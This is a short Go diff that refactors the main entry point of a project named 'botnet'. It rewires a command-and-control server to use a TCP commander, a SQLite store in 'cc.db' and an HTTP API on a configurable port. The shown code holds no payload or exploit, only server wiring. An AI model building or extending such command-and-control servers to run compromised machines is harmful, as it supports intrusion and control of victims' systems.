@@ -2,12 +2,21 @@ package main
 
 import (
 	"log"
+	"os"
 
-	"github.com/rodzzlessa24/botnet"
+	"github.com/rodzzlessa24/botnet/tcp"
+
+	"github.com/rodzzlessa24/botnet/http"
 	"github.com/rodzzlessa24/botnet/sqlite"
 )
 
 func main() {
+	// Set the httpAddress
+	httpAddress := ":8000"
+	if os.Getenv("PORT") != "" {
+		httpAddress = ":" + os.Getenv("PORT")
+	}
+
 	db, err := sqlite.Open("./cc.db")
 	if err != nil {
 		log.Panic(err)
@@ -15,8 +24,11 @@ func main() {
 	defer db.Close()
 	storage := &sqlite.Client{DB: db}
 
-	c := botnet.NewCC("127.0.0.1", "7890", storage)
+	commander := tcp.NewCC()
 
-	go c.Listen()
-	c.ListenAPI()
+	go commander.Listen()
+
+	h := http.NewHandler(commander, storage)
+
+	log.Fatal(http.ListenAndServe(httpAddress, h))
 }
